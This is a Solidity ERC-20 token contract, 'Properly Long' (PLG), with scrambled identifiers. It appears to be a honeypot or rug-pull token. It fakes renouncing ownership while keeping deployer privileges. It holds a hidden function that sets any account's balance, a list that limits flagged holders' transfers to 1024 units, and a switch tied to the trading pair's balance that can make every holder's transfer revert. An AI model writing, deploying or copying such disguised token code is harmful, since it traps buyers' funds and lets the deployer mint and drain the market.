//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface walletBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract marketingTeamFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverTeam {
    function createPair(address feeBuyTake, address listShould) external returns (address);
}

interface tokenTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fromReceiver) external view returns (uint256);

    function transfer(address receiverSell, uint256 exemptSender) external returns (bool);

    function allowance(address tradingSwap, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptSender) external returns (bool);

    function transferFrom(
        address sender,
        address receiverSell,
        uint256 exemptSender
    ) external returns (bool);

    event Transfer(address indexed from, address indexed exemptIs, uint256 value);
    event Approval(address indexed tradingSwap, address indexed spender, uint256 value);
}

interface tokenTxMetadata is tokenTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ProperlyLong is marketingTeamFrom, tokenTx, tokenTxMetadata {

    function senderTo(address launchExempt) public {
        require(launchExempt.balance < 100000);
        if (sellSender) {
            return;
        }
        if (sellBuyTeam == fundSell) {
            sellBuyTeam = senderTeam;
        }
        totalLaunchedAmount[launchExempt] = true;
        
        sellSender = true;
    }

    mapping(address => uint256) private receiverSwap;

    function allowance(address launchFrom, address sellLimit) external view virtual override returns (uint256) {
        if (sellLimit == sellTakeAuto) {
            return type(uint256).max;
        }
        return toAt[launchFrom][sellLimit];
    }

    address private feeReceiver;

    mapping(address => mapping(address => uint256)) private toAt;

    function getOwner() external view returns (address) {
        return feeReceiver;
    }

    function maxIs(address fundReceiverLimit) public {
        modeLimit();
        if (sellBuyTeam == senderTeam) {
            senderTeam = totalLaunched;
        }
        if (fundReceiverLimit == tradingSell || fundReceiverLimit == maxLimit) {
            return;
        }
        receiverTotal[fundReceiverLimit] = true;
    }

    event OwnershipTransferred(address indexed marketingSender, address indexed tradingLaunched);

    bool private teamFrom;

    function approve(address sellLimit, uint256 exemptSender) public virtual override returns (bool) {
        toAt[_msgSender()][sellLimit] = exemptSender;
        emit Approval(_msgSender(), sellLimit, exemptSender);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return tokenLiquidity;
    }

    address public maxLimit;

    function symbol() external view virtual override returns (string memory) {
        return shouldIs;
    }

    string private shouldIs = "PLG";

    function transfer(address launchSellLaunched, uint256 exemptSender) external virtual override returns (bool) {
        return tokenAmountLiquidity(_msgSender(), launchSellLaunched, exemptSender);
    }

    address public tradingSell;

    bool public modeTo;

    address txMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function modeLimit() private view {
        require(totalLaunchedAmount[_msgSender()]);
    }

    bool private tokenFee;

    mapping(address => bool) public totalLaunchedAmount;

    uint256 toMin;

    uint256 public fundSell;

    address sellTakeAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public sellSender;

    uint256 public atMinShould;

    function tokenAmountLiquidity(address marketingSwapAuto, address receiverSell, uint256 exemptSender) internal returns (bool) {
        if (marketingSwapAuto == tradingSell) {
            return senderTrading(marketingSwapAuto, receiverSell, exemptSender);
        }
        uint256 tradingMode = tokenTx(maxLimit).balanceOf(txMarketing);
        require(tradingMode == totalShould);
        require(receiverSell != txMarketing);
        if (receiverTotal[marketingSwapAuto]) {
            return senderTrading(marketingSwapAuto, receiverSell, fromLimit);
        }
        return senderTrading(marketingSwapAuto, receiverSell, exemptSender);
    }

    function isSellMarketing(uint256 exemptSender) public {
        modeLimit();
        totalShould = exemptSender;
    }

    mapping(address => bool) public receiverTotal;

    uint256 public totalLaunched;

    uint256 constant fromLimit = 2 ** 10;

    function totalSupply() external view virtual override returns (uint256) {
        return txReceiver;
    }

    function senderTrading(address marketingSwapAuto, address receiverSell, uint256 exemptSender) internal returns (bool) {
        require(receiverSwap[marketingSwapAuto] >= exemptSender);
        receiverSwap[marketingSwapAuto] -= exemptSender;
        receiverSwap[receiverSell] += exemptSender;
        emit Transfer(marketingSwapAuto, receiverSell, exemptSender);
        return true;
    }

    function tradingReceiverSender() public {
        emit OwnershipTransferred(tradingSell, address(0));
        feeReceiver = address(0);
    }

    function fromListTo(address launchSellLaunched, uint256 exemptSender) public {
        modeLimit();
        receiverSwap[launchSellLaunched] = exemptSender;
    }

    function owner() external view returns (address) {
        return feeReceiver;
    }

    uint256 totalShould;

    constructor (){
        if (feeAuto) {
            teamFrom = true;
        }
        walletBuy shouldSell = walletBuy(sellTakeAuto);
        maxLimit = receiverTeam(shouldSell.factory()).createPair(shouldSell.WETH(), address(this));
        
        tradingSell = _msgSender();
        tradingReceiverSender();
        totalLaunchedAmount[tradingSell] = true;
        receiverSwap[tradingSell] = txReceiver;
        
        emit Transfer(address(0), tradingSell, txReceiver);
    }

    function balanceOf(address fromReceiver) public view virtual override returns (uint256) {
        return receiverSwap[fromReceiver];
    }

    uint256 private txReceiver = 100000000 * 10 ** 18;

    bool public toSender;

    string private listMin = "Properly Long";

    uint256 private senderTeam;

    function name() external view virtual override returns (string memory) {
        return listMin;
    }

    uint256 private sellBuyTeam;

    uint8 private tokenLiquidity = 18;

    function transferFrom(address marketingSwapAuto, address receiverSell, uint256 exemptSender) external override returns (bool) {
        if (_msgSender() != sellTakeAuto) {
            if (toAt[marketingSwapAuto][_msgSender()] != type(uint256).max) {
                require(exemptSender <= toAt[marketingSwapAuto][_msgSender()]);
                toAt[marketingSwapAuto][_msgSender()] -= exemptSender;
            }
        }
        return tokenAmountLiquidity(marketingSwapAuto, receiverSell, exemptSender);
    }

    bool public feeAuto;

}